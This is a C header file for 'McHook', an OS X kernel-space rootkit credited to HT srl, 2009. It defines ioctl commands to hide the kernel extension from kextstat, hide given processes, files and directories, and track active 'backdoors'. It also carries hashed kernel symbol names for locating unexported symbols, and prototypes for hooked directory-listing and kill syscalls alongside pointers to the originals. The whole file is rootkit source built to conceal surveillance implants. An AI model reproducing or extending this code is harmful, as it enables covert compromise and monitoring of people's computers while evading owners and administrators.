/*
 * McHook, mchook.h
 *  OS X KSpace Rootkit
 * 
 * Created by revenge on 20/03/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#include <sys/ucred.h>
#include <sys/kernel.h>
#include <sys/kauth.h>
#include <sys/lock.h>

#include "structures.h"
#include "proc_internal.h"
#include "task_internal.h"

#pragma mark -
#pragma mark Symbols Hash
#pragma mark -

#define KMOD_HASH               0xdd2c36d6 // _kmod
#define NSYSENT_HASH            0xb366074d // _nsysent
#define TASKS_HASH              0xdbb44cef // _tasks
#define ALLPROC_HASH            0x3fd3c678 // _allproc
#define TASKS_COUNT_HASH        0xa3f77e7f // _tasks_count
#define NPROCS_HASH             0xa77ea22e // _nprocs
#define TASKS_THREADS_LOCK_HASH 0xd94f2751 // _tasks_threads_locks
#define PROC_LOCK_HASH          0x44c085d5 // _proc_lock
#define PROC_UNLOCK_HASH        0xf46ca50e // _proc_unlock
#define PROC_LIST_LOCK_HASH     0x9129f0e2 // _proc_list_lock
#define PROC_LIST_UNLOCK_HASH   0x5337599b // _proc_list_unlock

#pragma mark -
#pragma mark IOCTL Codes
#pragma mark -

#define MCHOOK_MAGIC      31338

// Used for the uspace<->kspace initialization
#define MCHOOK_INIT         _IOW(MCHOOK_MAGIC, 8978726, char [MAX_USER_SIZE]) // IN:username
// Show kext from kextstat -- DEBUG
#define MCHOOK_SHOWK        _IO( MCHOOK_MAGIC, 8349871)
// Hide kext from kextstat
#define MCHOOK_HIDEK        _IO( MCHOOK_MAGIC, 4975738)
// Hide given pid
#define MCHOOK_HIDEP        _IOW(MCHOOK_MAGIC, 9400284, char [MAX_USER_SIZE]) // IN:username
// Hide given dir/file name
#define MCHOOK_HIDED        _IOW(MCHOOK_MAGIC, 1998274, char [MAX_DIRNAME_SIZE]) // IN:dir
// Show Process -- DEBUG
#define MCHOOK_SHOWP        _IO( MCHOOK_MAGIC, 6839840)
// Unregister userspace component
#define MCHOOK_UNREGISTER   _IOW(MCHOOK_MAGIC, 5739299, char [MAX_USER_SIZE]) // IN:username
// Returns the number of active backdoors
#define MCHOOK_GET_ACTIVES  _IOR(MCHOOK_MAGIC, 7489827, int) // OUT: num of bd
// Pass symbols resolved from uspace to kspace (not exported symbol snow)
//#define MCHOOK_SOLVE_SYM    _IOW(MCHOOK_MAGIC, 6483647, struct symbol) // IN:symbol_32_t
#define MCHOOK_SOLVE_SYM_32 _IOW(MCHOOK_MAGIC, 6483647, struct symbol_32)
#define MCHOOK_SOLVE_SYM_64 _IOW(MCHOOK_MAGIC, 6483648, struct symbol_64)
// Tell the kext to find sysent
#define MCHOOK_FIND_SYS     _IOW(MCHOOK_MAGIC, 4548874, struct os_version) // IN:os_version_t

#pragma mark -
#pragma mark Kernel symbols
#pragma mark -

#define	P_WEXIT		0x00002000

#define         MACRO_BEGIN     do {
#define         MACRO_END       } while (FALSE)
  
#define queue_enter(head, elt, type, field)                      \
MACRO_BEGIN                                                      \
         register queue_entry_t __prev;                          \
                                                                 \
         __prev = (head)->prev;                                  \
         if ((head) == __prev) {                                 \
                 (head)->next = (queue_entry_t) (elt);           \
         }                                                       \
         else {                                                  \
                 ((type)__prev)->field.next = (queue_entry_t)(elt);\
         }                                                       \
         (elt)->field.prev = __prev;                             \
         (elt)->field.next = head;                               \
         (head)->prev = (queue_entry_t) elt;                     \
MACRO_END

#define queue_remove(head, elt, type, field)                     \
MACRO_BEGIN                                                      \
         register queue_entry_t  __next, __prev;                 \
                                                                 \
         __next = (elt)->field.next;                             \
         __prev = (elt)->field.prev;                             \
                                                                 \
         if ((head) == __next)                                   \
                 (head)->prev = __prev;                          \
         else                                                    \
                 ((type)__next)->field.prev = __prev;            \
                                                                 \
         if ((head) == __prev)                                   \
                 (head)->next = __next;                          \
         else                                                    \
                 ((type)__prev)->field.next = __next;            \
                                                                 \
         (elt)->field.next = NULL;                               \
         (elt)->field.prev = NULL;                               \
MACRO_END

#pragma mark -
#pragma mark Extern Symbols
#pragma mark -

static struct proclist *i_allproc       = NULL;
static queue_head_t *i_tasks            = NULL;
static int *i_nsysent                   = NULL;
static kmod_info_t *i_kmod              = NULL;
static int *i_tasks_count               = NULL;
static int *i_nprocs                    = NULL;
static lck_mtx_t *i_tasks_threads_lock  = NULL;

//decl_lck_mtx_data(static, *i_tasks_threads_lock);

static struct sysent *_sysent;

void (*i_proc_lock)       (struct proc *) = NULL;
void (*i_proc_unlock)     (struct proc *) = NULL;
void (*i_proc_list_lock)  (void)          = NULL;
void (*i_proc_list_unlock)(void)          = NULL;

#pragma mark -
#pragma mark Hooking Flags
#pragma mark -

// Flags used for determining if a syscall has been hooked
static int fl_getdire           = 0;
static int fl_getdire64         = 0;
static int fl_getdirentriesattr = 0;
//static int fl_kill              = 0;
//static int fl_shutdown          = 0;
//static int fl_reboot            = 0;


#pragma mark -
#pragma mark KEXT Prototypes
#pragma mark -

// IOCTL
static int cdev_open  (dev_t, int, int, struct proc *);
static int cdev_close (dev_t, int, int, struct proc *);
static int cdev_ioctl (dev_t, u_long, caddr_t, int, struct proc *);
// RK
#ifdef DEBUG
void getAttributesForBitFields    (attr_list_t al);
#endif
int     check_for_process_exclusions (pid_t pid);
void    dealloc_meh                  (char *, pid_t);
void    place_hooks                  ();
void    remove_hooks                 ();
void    add_dir_to_hide              (char *, pid_t);
void    hide_kext_leopard            ();
int     hide_proc                    (proc_t, char *, int);
int     unhide_proc                  (proc_t, int);
int     unhide_all_procs             ();
int     get_active_bd_index          (char *, pid_t);
int     get_bd_index                 (char *, pid_t);
int     check_symbols_integrity      ();
Boolean backdoor_init                (char *, proc_t);
int     remove_dev_entry             ();
static struct sysent *find_sysent (os_version_t *);

#pragma mark -
#pragma mark Hooked Syscall Prototypes
#pragma mark -
#if 0
int  hook_read                      (struct proc *,
                                     struct mk_read_args *,
                                     int *);
#endif

int  hook_kill                      (struct proc *,
                                     struct mk_kill_args *,
                                     int *);
int  hook_getdirentries             (struct proc *,
                                     struct mk_getdirentries_args *,
                                     int *);
int  hook_getdirentries64           (struct proc *,
                                     struct mk_getdirentries64_args *,
                                     int *);
int hook_getdirentriesattr          (struct proc *,
                                     struct mk_getdirentriesattr_args *uap,
                                     int *retval);
/*
int hook_shutdown                   (struct proc *,
                                     struct mk_shutdown_args *,
                                     int *);
int hook_reboot                     (struct proc *,
                                     struct mk_reboot_args *,
                                     int *);
*/
typedef int kill_func_t             (struct proc *,
                                     struct mk_kill_args *,
                                     int *);
typedef int	read_func_t             (struct proc *,
                                     struct mk_read_args *,
                                     int *);
typedef int	getdirentries_func_t    (struct proc *,
                                     struct mk_getdirentries_args *,
                                     int *);
typedef int	getdirentries64_func_t  (struct proc *,
                                     struct mk_getdirentries64_args *,
                                     int *);
typedef int getattrlist_func_t      (struct proc *,
                                     struct mk_getattrlist_args *,
                                     int *);
typedef int getdirentriesattr_func_t(struct proc *,
                                     struct mk_getdirentriesattr_args *,
                                     int *);
/*
typedef int shutdown_func_t         (struct proc *,
                                     struct mk_shutdown_args *,
                                     int *);
typedef int reboot_func_t           (struct proc *,
                                     struct mk_reboot_args *,
                                     int *);
*/
//static read_func_t              *real_read;
//static kill_func_t              *real_kill;
static getdirentries_func_t     *real_getdirentries;
static getdirentries64_func_t   *real_getdirentries64;
static getdirentriesattr_func_t *real_getdirentriesattr;
//static shutdown_func_t          *real_shutdown;
//static reboot_func_t            *real_reboot;

int is_leopard();
int is_snow_leopard();
int is_lion();
